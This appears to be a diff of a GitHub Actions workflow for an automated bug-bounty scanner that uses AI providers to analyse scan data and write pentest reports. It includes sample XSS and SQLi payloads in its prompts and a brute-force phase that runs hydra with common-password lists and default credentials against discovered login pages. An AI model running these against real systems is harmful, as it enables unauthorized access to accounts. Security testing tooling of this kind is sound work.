+                    req = urllib.request.Request(test_url, headers={"User-Agent": os.environ.get("SCAN_USER_AGENT","Mozilla/5.0")})
+                    with urllib.request.urlopen(req, timeout=5) as r:
+                        body = r.read().decode(errors="ignore")
+                        if 'burpcollaborator' in body.lower():
+                            oob_findings.append(f"[OOB-SSRF] {test_url} | Reflected in response")
+                            break
+                except Exception:
+                    continue
+except Exception:
+    pass
+
+with open(oob_out, "w") as f:
+    f.write("\n".join(oob_findings))
+print(f"✅ OOB detection: {len(oob_findings)} potential SSRF/OOB findings")
+PYEOF
+          fi
+
+      # ============================================================
+      # PHASE 6 — AI AGENT (Multi-Agent Analysis)
+      # ============================================================
+      - name: "🧠 Phase 6a — AI Injection Analysis"
+        continue-on-error: true
+        timeout-minutes: 30
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          mkdir -p "$RD/ai_agent/brute"
+          python3 << 'PYEOF'
+import urllib.request, urllib.parse, json, os, sys, time, re, html
+
+rd = "results/" + os.environ.get("TIMESTAMP", "")
+target = os.environ.get("TARGET", "")
+
+# ── AI Provider Setup ──
+def call_with_retry(provider, prompt, attempts=3, backoff=3):
+    import urllib.request, urllib.error, json, time
+    last_err = None
+    timeout = 60
+    for i in range(attempts):
+        try:
+            req = urllib.request.Request(
+                provider["url"],
+                data=provider["body_tpl"](prompt),
+                headers=provider["headers"],
+                method="POST"
+            )
+            with urllib.request.urlopen(req, timeout=timeout) as r:
+                return json.loads(r.read())
+        except urllib.error.HTTPError as e:
+            try:
+                body_preview = e.read(400).decode(errors="ignore")
+            except Exception:
+                body_preview = ""
+            last_err = Exception(f"HTTP {e.code} -> {body_preview[:200]}")
+            if i < attempts - 1:
+                wait = backoff
+                if e.code == 429:
+                    try:
+                        wait = min(int(e.headers.get("Retry-After", backoff)), 30)
+                    except Exception:
+                        wait = backoff
+                time.sleep(wait)
+        except Exception as e:
+            last_err = e
+            if i < attempts - 1:
+                time.sleep(backoff)
+    raise last_err
+
+providers = []
+if os.environ.get("ANTHROPIC_API_KEY", ""):
+    providers.append({
+        "name": "Anthropic",
+        "url": "https://api.anthropic.com/v1/messages",
+        "headers": {"x-api-key": os.environ["ANTHROPIC_API_KEY"], "anthropic-version": "2023-06-01", "content-type": "application/json"},
+        "body_tpl": lambda p: json.dumps({"model": os.environ.get("ANTHROPIC_MODEL_NAME", "claude-sonnet-4-6"), "max_tokens": 8192, "messages": [{"role": "user", "content": p}]}).encode(),
+        "extract": lambda r: r["content"][0]["text"]
+    })
+if os.environ.get("OPENROUTER_API_KEY", ""):
+    providers.append({
+        "name": "OpenRouter",
+        "url": "https://openrouter.ai/api/v1/chat/completions",
+        "headers": {"Authorization": f"Bearer {os.environ['OPENROUTER_API_KEY']}", "content-type": "application/json"},
+        "body_tpl": lambda p: json.dumps({"model": os.environ.get("OPENROUTER_MODEL_NAME", "anthropic/claude-sonnet-4"), "max_tokens": 8192, "messages": [{"role": "user", "content": p}]}).encode(),
+        "extract": lambda r: r["choices"][0]["message"]["content"]
+    })
+if os.environ.get("OPENROUTER_API_KEY", ""):
+    providers.append({
+        "name": "OpenRouter-free",
+        "url": "https://openrouter.ai/api/v1/chat/completions",
+        "headers": {"Authorization": f"Bearer {os.environ['OPENROUTER_API_KEY']}", "content-type": "application/json"},
+        "body_tpl": lambda p: json.dumps({"model": os.environ.get("OPENROUTER_FREE_MODEL_NAME", "meta-llama/llama-3.3-70b-instruct:free"), "max_tokens": 8192, "messages": [{"role": "user", "content": p}]}).encode(),
+        "extract": lambda r: r["choices"][0]["message"]["content"]
+    })
+if os.environ.get("GROQ_API_KEY", ""):
+    providers.append({
+        "name": "Groq",
+        "url": "https://api.groq.com/openai/v1/chat/completions",
+        "headers": {"Authorization": f"Bearer {os.environ['GROQ_API_KEY']}", "content-type": "application/json"},
+        "body_tpl": lambda p: json.dumps({"model": os.environ.get("GROQ_MODEL_NAME", "llama3-70b-8192"), "max_tokens": 8192, "messages": [{"role": "user", "content": p}]}).encode(),
+        "extract": lambda r: r["choices"][0]["message"]["content"]
+    })
+if os.environ.get("GEMINI_API_KEY", ""):
+    providers.append({
+        "name": "Gemini",
+        "url": f"https://generativelanguage.googleapis.com/v1beta/models/{os.environ.get('GEMINI_MODEL_NAME', 'gemini-2.5-flash')}:generateContent?key={os.environ['GEMINI_API_KEY']}",
+        "headers": {"content-type": "application/json"},
+        "body_tpl": lambda p: json.dumps({"contents": [{"parts": [{"text": p}]}], "generationConfig": {"maxOutputTokens": 8192}}).encode(),
+        "extract": lambda r: r["candidates"][0]["content"]["parts"][0]["text"]
+    })
+if os.environ.get("OPENAI_API_KEY", ""):
+    providers.append({
+        "name": "OpenAI",
+        "url": "https://api.openai.com/v1/chat/completions",
+        "headers": {"Authorization": f"Bearer {os.environ['OPENAI_API_KEY']}", "content-type": "application/json"},
+        "body_tpl": lambda p: json.dumps({"model": os.environ.get("OPENAI_MODEL_NAME", "gpt-5.5"), "max_tokens": 8192, "messages": [{"role": "user", "content": p}]}).encode(),
+        "extract": lambda r: r["choices"][0]["message"]["content"]
+    })
+
+if not providers:
+    print("⚠️ No AI providers configured — writing empty findings")
+    for fname in ["injection_findings.json", "injection_findings.txt", "xxe_findings.txt", "graphql_findings.txt", "idor_findings.txt", "chained_analysis.json"]:
+        with open(os.path.join(rd, "ai_agent", fname), "w") as f:
+            f.write("[]" if fname.endswith(".json") else "")
+    sys.exit(0)
+
+# ── Gather scan data ──
+def rf(path, cap=5000):
+    try:
+        with open(os.path.join(rd, path)) as f:
+            return f.read()[:cap]
+    except Exception:
+        return "N/A"
+
+urls_data = rf("urls/all.txt", 3000)
+live_data = rf("live/live.txt", 2000)
+js_files = rf("js/js_files.txt", 1000)
+nuclei_data = rf("nuclei/findings.jsonl", 3000)
+cors_data = rf("cors/vulnerable.txt", 1000)
+admin_data = rf("js/admin.txt", 1000)
+sensitive_data = rf("files/sensitive.txt", 1000)
+
+# ── 1. INJECTION ANALYSIS ──
+print("🔍 AI Agent: Injection analysis...")
+injection_prompt = f"""You are a senior bug bounty hunter analyzing {target}.
+
+SCAN DATA:
+URLS: {urls_data[:2000]}
+LIVE HOSTS: {live_data[:1500]}
+ADMIN PATHS: {admin_data[:1000]}
+SENSITIVE FILES: {sensitive_data[:1000]}
+NUCLEI FINDINGS: {nuclei_data[:2000]}
+
+TASK: Analyze for injection vulnerabilities (XSS, SQLi, SSTI, LFI, SSRF, Command Injection, Open Redirect, NoSQLi).
+
+For each potential finding, format EXACTLY like this:
+[XSS] Parameter: q | URL: https://example.com/search?q=test | Evidence: Reflected unsanitized | Payload: <script>alert(1)</script>
+[SQLi] Parameter: id | URL: https://example.com/page?id=1 | Evidence: Time-based delay | Payload: ' OR SLEEP(5)-- -
+
+Return ONLY confirmed/high-confidence findings. Be specific about parameter names, URLs, and evidence."""
+
+# ── 2. XXE ANALYSIS ──
+print("🔍 AI Agent: XXE analysis...")
+xxe_prompt = f"""Analyze {target} for XXE (XML External Entity) vulnerabilities.
+
+Focus on:
+- Endpoints accepting XML
+- File upload features
+- SOAP endpoints
+- API endpoints
+
+If found, format: [XXE] URL: https://... | Evidence: ... | Payload: ...
+
+Return "No XXE findings" if none found."""
+
+# ── 3. GraphQL ANALYSIS ──
+print("🔍 AI Agent: GraphQL analysis...")
+gql_prompt = f"""Analyze {target} for GraphQL vulnerabilities.
+
+Look for:
+- Introspection enabled
+- Batching attacks
+- Depth-based DoS
+- Missing auth on mutations
+- Information disclosure
+
+URLs to analyze: {urls_data[:1500]}
+Admin paths: {admin_data[:500]}
+
+Format: [GRAPHQL-INTROSPECTION] URL: ... | Evidence: ..."""
+
+# ── 4. IDOR ANALYSIS ──
+print("🔍 AI Agent: IDOR analysis...")
+idor_prompt = f"""Analyze {target} for Insecure Direct Object Reference (IDOR).
+
+Focus on patterns like:
+- /api/users/123
+- /download/456
+- /invoice/789
+- UUIDs in URLs
+
+URLs: {urls_data[:2000]}
+
+Format: [IDOR] URL: ... | Parameter: ... | Evidence: ..."""
+
+# ── Execute AI calls ──
+analyses = {
+    "injection_findings.txt": injection_prompt,
+    "xxe_findings.txt": xxe_prompt,
+    "graphql_findings.txt": gql_prompt,
+    "idor_findings.txt": idor_prompt
+}
+
+for fname, prompt in analyses.items():
+    ok = False
+    for p in providers:
+        try:
+            print(f"  -> {p['name']} for {fname}...")
+            res = call_with_retry(p, prompt)
+            text = p["extract"](res)
+            with open(os.path.join(rd, "ai_agent", fname), "w") as f:
+                f.write(text)
+            print(f"  ✅ {len(text)} chars")
+            ok = True
+            break
+        except Exception as e:
+            print(f"  ⚠️ {p['name']}: {e}")
+            continue
+    if not ok:
+        print(f"  ❌ All providers failed for {fname}")
+        with open(os.path.join(rd, "ai_agent", fname), "w") as f:
+            f.write("")
+
+# ── 5. CHAINED ANALYSIS ──
+print("🔍 AI Agent: Chained attack analysis...")
+chain_prompt = f"""Analyze {target} for CHAINED ATTACK VECTORS (combining multiple low-severity issues).
+
+Data from scans:
+Injections: {rf('ai_agent/injection_findings.txt', 2000)}
+CORS: {cors_data[:500]}
+Sensitive: {sensitive_data[:500]}
+Admin: {admin_data[:500]}
+
+For each chain, format:
+[CHAIN-SQLi2RCE] Description: SQLi → File Write → RCE | Steps: 1. SQLi at /api/users 2. Write webshell 3. Execute commands | CVSS: 9.1
+
+Return as JSON array."""
+
+for p in providers:
+    try:
+        res = call_with_retry(p, chain_prompt)
+        text = p["extract"](res)
+        with open(os.path.join(rd, "ai_agent", "chained_analysis.json"), "w") as f:
+            f.write(text)
+        print(f"  ✅ Chained analysis: {len(text)} chars")
+        break
+    except Exception as e:
+        print(f"  ⚠️ Chain: {e}")
+        continue
+else:
+    with open(os.path.join(rd, "ai_agent", "chained_analysis.json"), "w") as f:
+        f.write("[]")
+
+# ── Also save combined injection findings as JSON for processing ──
+print("✅ AI Agent analysis complete")
+PYEOF
+
+      # ============================================================
+      # PHASE 6b — AI Agent Brute Force
+      # ============================================================
+      - name: "🔑 Phase 6b — AI-Guided Brute Force"
+        continue-on-error: true
+        timeout-minutes: 15
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          python3 << 'PYEOF'
+import os, subprocess, json, sys
+
+rd = "results/" + os.environ.get("TIMESTAMP", "")
+target = os.environ.get("TARGET", "")
+brute_dir = os.path.join(rd, "ai_agent", "brute")
+os.makedirs(brute_dir, exist_ok=True)
+
+# Read admin/login paths from fuzzing
+admin_paths = []
+try:
+    with open(os.path.join(rd, "js", "admin.txt")) as f:
+        for line in f:
+            line = line.strip()
+            if line and not line.startswith("#") and ("login" in line.lower() or "admin" in line.lower()):
+                admin_paths.append(line)
+except Exception:
+    pass
+
+if not admin_paths:
+    print("No login/admin paths found for brute force")
+    sys.exit(0)
+
+# Use first live host
+live_host = ""
+try:
+    with open(os.path.join(rd, "live", "live.txt")) as f:
+        line = f.readline().strip()
+        if line:
+            live_host = line.split()[0] if line.split()[0].startswith("http") else "https://" + line.split()[0]
+except Exception:
+    pass
+
+if not live_host:
+    live_host = f"https://{target}"
+
+print(f"Brute force targets: {len(admin_paths)} paths on {live_host[:60]}")
+
+# Download password lists
+if not os.path.exists("/tmp/passwords.txt"):
+    subprocess.run(["curl", "-sL", "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt", "-o", "/tmp/passwords.txt"], timeout=30, capture_output=True)
+if not os.path.exists("/tmp/usernames.txt"):
+    subprocess.run(["curl", "-sL", "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt", "-o", "/tmp/usernames.txt"], timeout=30, capture_output=True)
+
+# Try hydra for form-based auth
+results = []
+for path in admin_paths[:10]:
+    url = path if path.startswith("http") else live_host.rstrip("/") + "/" + path.lstrip("/")
+    print(f"  Testing: {url[:80]}")
+
+    # Simple curl-based brute force (non-destructive)
+    if os.path.exists("/tmp/usernames.txt") and os.path.exists("/tmp/passwords.txt"):
+        cmds = [
+            ["hydra", "-L", "/tmp/usernames.txt", "-P", "/tmp/passwords.txt", "-t", "4", "-w", "5", "-f", "-o", f"{brute_dir}/hydra_{os.path.basename(path)}.txt", url.replace("https://", "").replace("http://", ""), "http-post-form", f"{path}:username=^USER^&password=^PASS^:F=incorrect", "-s", "443", "-S"],
+            ["hydra", "-L", "/tmp/usernames.txt", "-P", "/tmp/passwords.txt", "-t", "4", "-w", "5", "-f", "-o", f"{brute_dir}/hydra_{os.path.basename(path)}.txt", url.replace("https://", "").replace("http://", ""), "http-post-form", f"{path}:user=^USER^&pass=^PASS^:F=invalid"]
+        ]
+        for cmd in cmds:
+            try:
+                subprocess.run(cmd, timeout=60, capture_output=True)
+                break
+            except Exception:
+                continue
+
+    # Check for default credentials
+    defaults = [("admin", "admin"), ("admin", "password"), ("admin", "123456"), ("root", "root"), ("user", "user"), ("test", "test"), ("administrator", "administrator")]
+    for user, passwd in defaults:
+        try:
+            import urllib.request
+            data = urllib.parse.urlencode({"username": user, "password": passwd, "user": user, "pass": passwd, "login": "submit"}).encode()
+            req = urllib.request.Request(url, data=data, headers={"User-Agent": os.environ.get("SCAN_USER_AGENT","Mozilla/5.0")})
+            with urllib.request.urlopen(req, timeout=5) as r:
+                body = r.read().decode(errors="ignore").lower()
+                if "invalid" not in body and "incorrect" not in body and "failed" not in body and len(body) > 100:
+                    results.append(f"[BRUTE-DEFAULT] {url} | {user}:{passwd} | Status: {r.status}")
+                    break
+        except Exception:
+            continue
+
+with open(os.path.join(brute_dir, "summary.txt"), "w") as f:
+    f.write("\n".join(results) if results else "No brute force credentials found")
+
+print(f"✅ Brute force: {len(results)} potential credential findings")
+PYEOF
+
+      # ============================================================
+      # PHASE 6c — Multi-Agent AI Debate & Persistent Knowledge Base
+      # ============================================================
+      - name: "🧠 Phase 6c — AI Multi-Agent Debate & Knowledge Base"
+        if: env.HUNTING_MODE == 'aggressive'
+        continue-on-error: true
+        timeout-minutes: 20
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          python3 << 'PYEOF'
+import json, os, sqlite3, datetime
+
+rd = "results/" + os.environ.get("TIMESTAMP", "")
+target = os.environ.get("TARGET", "")
+db_path = os.path.join(rd, "ai_agent", "knowledge.db")
+
+# ── Persistent SQLite Knowledge Base ──
+conn = sqlite3.connect(db_path)
+c = conn.cursor()
+c.execute("""
+    CREATE TABLE IF NOT EXISTS findings (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        target TEXT,
+        scan_id TEXT,
+        finding_type TEXT,
+        severity TEXT,
+        url TEXT,
+        description TEXT,
+        timestamp TEXT,
+        remediation TEXT
+    )
+""")
+c.execute("""
+    CREATE TABLE IF NOT EXISTS scan_history (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        target TEXT,
+        scan_id TEXT,
+        subs_count INTEGER,
+        live_count INTEGER,
+        findings_count INTEGER,
+        waf_block_pct REAL,
+        timestamp TEXT
+    )
+""")
+conn.commit()
+
+# Read individual AI agent findings files
+def read_findings(filename):
+    try:
+        with open(os.path.join(rd, "ai_agent", filename)) as f:
+            return f.read()
+    except Exception:
+        return ""
+
+inj = read_findings("injection_findings.txt")
+xxe = read_findings("xxe_findings.txt")
+gql = read_findings("graphql_findings.txt")
+idor = read_findings("idor_findings.txt")
+chain = read_findings("chained_analysis.json")
+
+# Store in knowledge base
+scan_id = os.environ.get("TIMESTAMP", "unknown")
+now = datetime.datetime.utcnow().isoformat()
+for source, source_name in [(inj, "injection"), (xxe, "xxe"), (gql, "graphql"), (idor, "idor")]:
+    for line in source.split("\n"):
+        line = line.strip()
+        if not line:
+            continue
+        severity = "medium"
+        if "CRITICAL" in line.upper() or "SQLi" in line or "RCE" in line:
+            severity = "critical"
+        elif "HIGH" in line.upper() or "SSRF" in line or "SSTI" in line:
+            severity = "high"
+        c.execute(
+            "INSERT INTO findings (target, scan_id, finding_type, severity, url, description, timestamp, remediation) VALUES (?,?,?,?,?,?,?,?)",
+            (target, scan_id, source_name, severity, line[:200], line[:500], now, "")
+        )
+
+# Multi-Agent Debate: Compare findings and look for contradictions
+print("🔍 AI Multi-Agent Debate: Analyzing finding consistency...")
+
+# Read nuclei findings for cross-reference
+nuclei_findings = []
+try:
+    with open(os.path.join(rd, "nuclei", "findings.jsonl")) as f:
+        for line in f:
+            try:
+                j = json.loads(line)
+                nuclei_findings.append(j)
+            except Exception:
+                continue
+except Exception:
+    pass
+
+# Cross-reference: AI findings vs Nuclei findings
+debate_results = []
+nuclei_high_sev = [n for n in nuclei_findings if n.get("info", {}).get("severity") in ["high", "critical"]]
+if nuclei_high_sev and ("No" in inj and "No" in xxe):
+    debate_results.append(f"[DEBATE-CONFLICT] Nuclei found {len(nuclei_high_sev)} high/critical findings, but AI agent found none. Possible false negative in AI analysis.")
+
+# Save debate results
+with open(os.path.join(rd, "ai_agent", "debate_results.txt"), "w") as f:
+    f.write("\n".join(debate_results) if debate_results else "No inconsistencies found in this scan")
+
+# Save scan history
+c.execute(
+    "INSERT INTO scan_history (target, scan_id, subs_count, live_count, findings_count, waf_block_pct, timestamp) VALUES (?,?,?,?,?,?,?)",
+    (target, scan_id, int(os.environ.get("SUBS", 0)), int(os.environ.get("LIVE", 0)),
+     len(inj.split("\n")) + len(xxe.split("\n")) + len(gql.split("\n")) + len(idor.split("\n")),
+     float(os.environ.get("SCAN_BLOCK_PCT", 0)), now)
+)
+conn.commit()
+conn.close()
+print(f"✅ Knowledge base updated: {db_path}")
+PYEOF
+
+      # ============================================================
+      # PHASE 7 — REPORT GENERATION
+      # ============================================================
+      - name: "📄 Phase 7 — AI Final Report Generation"
+        continue-on-error: true
+        timeout-minutes: 15
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          mkdir -p "$RD/ai"
+
+          python3 << 'PYEOF'
+import urllib.request, urllib.error, json, os, sys, datetime, time
+
+rd = "results/" + os.environ.get("TIMESTAMP", "")
+target = os.environ.get("TARGET", "")
+
+# ── AI Provider Setup (same as Phase 6a) ──
+def call_with_retry(provider, prompt, attempts=3, backoff=3):
+    last_err = None
+    timeout = 120
+    for i in range(attempts):
+        try:
+            req = urllib.request.Request(provider["url"], data=provider["body_tpl"](prompt), headers=provider["headers"], method="POST")
+            with urllib.request.urlopen(req, timeout=timeout) as r:
+                return json.loads(r.read())
+        except urllib.error.HTTPError as e:
+            try:
+                body_preview = e.read(400).decode(errors="ignore")
+            except Exception:
+                body_preview = ""
+            last_err = Exception(f"HTTP {e.code} -> {body_preview[:200]}")
+            if i < attempts - 1:
+                wait = backoff
+                if e.code == 429:
+                    try:
+                        wait = min(int(e.headers.get("Retry-After", backoff)), 30)
+                    except Exception:
+                        wait = backoff
+                time.sleep(wait)
+        except Exception as e:
+            last_err = e
+            if i < attempts - 1:
+                time.sleep(backoff)
+    raise last_err
+
+providers = []
+if os.environ.get("ANTHROPIC_API_KEY", ""):
+    providers.append({"name":"Anthropic","url":"https://api.anthropic.com/v1/messages","headers":{"x-api-key":os.environ["ANTHROPIC_API_KEY"],"anthropic-version":"2023-06-01","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("ANTHROPIC_MODEL_NAME","claude-sonnet-4-6"),"max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["content"][0]["text"]})
+if os.environ.get("OPENROUTER_API_KEY", ""):
+    providers.append({"name":"OpenRouter","url":"https://openrouter.ai/api/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENROUTER_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("OPENROUTER_MODEL_NAME","anthropic/claude-sonnet-4"),"max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+if os.environ.get("OPENROUTER_API_KEY", ""):
+    providers.append({"name":"OpenRouter-free","url":"https://openrouter.ai/api/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENROUTER_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("OPENROUTER_FREE_MODEL_NAME","meta-llama/llama-3.3-70b-instruct:free"),"max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+if os.environ.get("GROQ_API_KEY", ""):
+    providers.append({"name":"Groq","url":"https://api.groq.com/openai/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['GROQ_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("GROQ_MODEL_NAME","llama3-70b-8192"),"max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+if os.environ.get("GEMINI_API_KEY", ""):
+    providers.append({"name":"Gemini","url":f"https://generativelanguage.googleapis.com/v1beta/models/{os.environ.get('GEMINI_MODEL_NAME','gemini-2.5-flash')}:generateContent?key={os.environ['GEMINI_API_KEY']}","headers":{"content-type":"application/json"},"body_tpl":lambda p:json.dumps({"contents":[{"parts":[{"text":p}]}],"generationConfig":{"maxOutputTokens":8192}}).encode(),"extract":lambda r:r["candidates"][0]["content"]["parts"][0]["text"]})
+if os.environ.get("OPENAI_API_KEY", ""):
+    providers.append({"name":"OpenAI","url":"https://api.openai.com/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENAI_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("OPENAI_MODEL_NAME","gpt-5.5"),"max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+
+def rf(path, cap=3000):
+    try:
+        with open(os.path.join(rd, path)) as f:
+            return f.read()[:cap]
+    except Exception:
+        return "N/A"
+
+inj = rf("ai_agent/injection_findings.txt", 3000)
+xxe = rf("ai_agent/xxe_findings.txt")
+gql = rf("ai_agent/graphql_findings.txt")
+idor = rf("ai_agent/idor_findings.txt")
+chain = rf("ai_agent/chained_analysis.json", 2000)
+nuc = rf("nuclei/findings.jsonl", 2000)
+cors = rf("cors/vulnerable.txt")
+sens = rf("files/sensitive.txt")
+tako = rf("nuclei/takeover.jsonl", 1000)
+brute = rf("ai_agent/brute/summary.txt", 1000)
+race = rf("ai_agent/race_conditions.txt", 1000)
+mass = rf("ai_agent/mass_assignment.txt", 1000)
+oob = rf("ai_agent/oob_findings.txt", 1000)
+debate = rf("ai_agent/debate_results.txt", 1000)
+
+core = [inj, xxe, gql, idor, nuc, cors, sens]
+empty_markers = ("N/A", "", "[]", "No XXE findings", "No GraphQL findings", "No IDOR findings")
+has_any = any(v.strip() not in empty_markers for v in core)
+
+# ── WAF Reliability Section ──
+block_pct = int(os.environ.get("SCAN_BLOCK_PCT", "0") or "0")
+blocked_hosts = os.environ.get("SCAN_BLOCKED_HOSTS", "0")
+total_hosts = os.environ.get("SCAN_TOTAL_HOSTS", "0")
+disclaimer = ""
+
+if block_pct >= 30:
+    disclaimer = (f"## ⚠️ Scan Reliability Warning\n\n"
+                  f"**{blocked_hosts}/{total_hosts} hosts ({block_pct}%)** returned a WAF/bot-challenge "
+                  f"response (403/429/Cloudflare challenge). "
+                  f"A significant portion of traffic likely never reached the real application. "
+                  f"**A clean result should NOT be read as \"secure\"** - manual verification from "
+                  f"a different network/IP is recommended.\n\n---\n\n")
+elif int(total_hosts or "0") > 0:
+    disclaimer = (f"## ✅ Scan Reliability\n\n{blocked_hosts}/{total_hosts} hosts ({block_pct}%) were "
+                  f"blocked - most traffic reached the real application.\n\n---\n\n")
+
+if not has_any or not providers:
+    rpt = (f"# Security Report: {target}\n"
+           f"**{datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}**\n\n"
+           f"{disclaimer}## No Confirmed Vulnerabilities\nClean scan.\n\n"
+           f"### Scan Statistics\n"
+           f"- Subdomains found: {os.environ.get('SUBS', 'N/A')}\n"
+           f"- Live hosts: {os.environ.get('LIVE', 'N/A')}\n"
+           f"- WAF blocked: {blocked_hosts}/{total_hosts} ({block_pct}%)\n"
+           f"- Nuclei findings: {nuc.count(chr(10)) if nuc else 0}\n")
+    os.makedirs(os.path.join(rd, "ai"), exist_ok=True)
+    with open(os.path.join(rd, "ai", "security_report.md"), "w") as f:
+        f.write(rpt)
+    print("📄 Clean report written")
+    sys.exit(0)
+
+prompt = f"""You are a senior bug bounty hunter writing the FINAL security assessment report for {target}.
+
+SCAN DATA:
+INJECTIONS: {inj}
+XXE: {xxe}
+GRAPHQL: {gql}
+IDOR: {idor}
+CHAINED ATTACKS: {chain}
+NUCLEI: {nuc}
+CORS: {cors}
+SENSITIVE DATA: {sens}
+SUBDOMAIN TAKEOVER: {tako}
+BRUTE FORCE: {brute}
+RACE CONDITIONS: {race}
+MASS ASSIGNMENT: {mass}
+OOB FINDINGS: {oob}
+AI DEBATE: {debate}
+
+Write a professional penetration testing report with these EXACT sections:
+
+# Executive Summary
+(Brief overview for management - 2-3 paragraphs)
+
+# Findings (ONLY confirmed vulnerabilities)
+For EACH finding, use this exact format:
+## [Severity] Title
+**Type:** (SQLi/XSS/IDOR/etc)
+**URL:** (full URL)
+**Severity:** (Critical/High/Medium/Low)
+**Steps to Reproduce:**
+1. ...
+2. ...
+**Proof of Concept:**
+(technical details, payloads)
+**Impact:**
+(business impact)
+**Remediation:**
+(fix recommendation)
+
+# Attack Chaining
+(How multiple findings can be combined for greater impact)
+
+# Statistics
+- Total findings: (count)
+- By severity: (breakdown)
+- Recon coverage: (subs, live, URLs)
+- WAF block rate: {block_pct}%
+
+# Top 5 Recommendations
+1. ...
+2. ...
+3. ...
+4. ...
+5. ..."""
+
+ok = False
+for p in providers:
+    try:
+        print(f"  -> {p['name']} generating report...")
+        res = call_with_retry(p, prompt)
+        text = p["extract"](res)
+        os.makedirs(os.path.join(rd, "ai"), exist_ok=True)
+        with open(os.path.join(rd, "ai", "security_report.md"), "w") as f:
+            f.write(f"# AI Security Report: {target}\n\n{disclaimer}{text}")
+        print(f"✅ Report ({len(text)} chars) via {p['name']}")
+        ok = True
+        break
+    except Exception as e:
+        print(f"⚠️ {p['name']}: {e}")
+        continue
+
+if not ok:
+    print("❌ All providers failed for report generation")
+    fallback = (f"# Security Report: {target}\n"
+                f"**{datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}**\n\n"
+                f"{disclaimer}## AI Report Generation Failed\n"
+                f"No AI provider was able to generate the report. "
+                f"Check API keys and network connectivity.\n\n"
+                f"### Raw Findings\n"
+                f"See the individual finding files in the artifact.")
+    with open(os.path.join(rd, "ai", "security_report.md"), "w") as f:
+        f.write(fallback)
+    print("📄 Fallback report written")
+
+print("✅ Phase 7 complete")
+PYEOF
+
+      # ============================================================
+      # COUNT FINDINGS
+      # ============================================================
+      - name: "🔢 Count Total Findings"
+        id: count_findings
+        if: always()
+        continue-on-error: true
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INJECT=$(grep -cE '\[(XSS|SSTI|SQLi|LFI|SSRF|Command|Redirect|NoSQLi)\]' "$RD/ai_agent/injection_findings.txt" 2>/dev/null || true); INJECT=${INJECT:-0}
+          XXE=$(grep -c '\[XXE\]' "$RD/ai_agent/xxe_findings.txt" 2>/dev/null || true); XXE=${XXE:-0}
+          GQL=$(grep -c '\[GRAPHQL' "$RD/ai_agent/graphql_findings.txt" 2>/dev/null || true); GQL=${GQL:-0}
+          IDOR=$(grep -c '\[IDOR\]' "$RD/ai_agent/idor_findings.txt" 2>/dev/null || true); IDOR=${IDOR:-0}
+          NUCLEI=$(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || true); NUCLEI=${NUCLEI:-0}
+          SENS=$(wc -l < "$RD/files/sensitive.txt" 2>/dev/null || true); SENS=${SENS:-0}
+          CORS=$(wc -l < "$RD/cors/vulnerable.txt" 2>/dev/null || true); CORS=${CORS:-0}
+          BRUTE=$(ls "$RD/ai_agent/brute"/*.txt 2>/dev/null | wc -l || echo 0)
+          RACE=$(grep -c '\[RACE' "$RD/ai_agent/race_conditions.txt" 2>/dev/null || true); RACE=${RACE:-0}
+          MASS=$(grep -c '\[MASS' "$RD/ai_agent/mass_assignment.txt" 2>/dev/null || true); MASS=${MASS:-0}
+          OOB=$(grep -c '\[OOB' "$RD/ai_agent/oob_findings.txt" 2>/dev/null || true); OOB=${OOB:-0}
+          TOTAL=$(( INJECT + XXE + GQL + IDOR + NUCLEI + SENS + CORS + BRUTE + RACE + MASS + OOB ))
+          echo "finding_count=$TOTAL" >> "$GITHUB_OUTPUT"
+          echo "🔢 Total confirmed findings: $TOTAL"
+
+      # ============================================================
+      # DIFF AGAINST PREVIOUS SCAN
+      # ============================================================
+      - name: "🆚 Diff Against Previous Scan"
+        continue-on-error: true
+        timeout-minutes: 3
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          mkdir -p "$RD/diff" .previous_snapshot
+          diff_section() {
+            label="$1"; old="$2"; new="$3"
+            touch "$old" "$new"
+            new_items=$(comm -13 <(sort -u "$old") <(sort -u "$new") 2>/dev/null)
+            gone_items=$(comm -23 <(sort -u "$old") <(sort -u "$new") 2>/dev/null)
+            new_count=$(echo -n "$new_items" | grep -c . || true); new_count=${new_count:-0}
+            gone_count=$(echo -n "$gone_items" | grep -c . || true); gone_count=${gone_count:-0}
+            {
+              echo "## $label"
+              if [ -s ".previous_snapshot/${label}.txt" ] || [ -s "$old" ]; then
+                echo "🆕 New since last scan ($new_count):"
+                [ -n "$new_items" ] && echo "$new_items" | sed 's/^/- /' || echo "- (none)"
+                echo ""
+                echo "🗑️ Gone since last scan ($gone_count):"
+                [ -n "$gone_items" ] && echo "$gone_items" | sed 's/^/- /' || echo "- (none)"
+              else
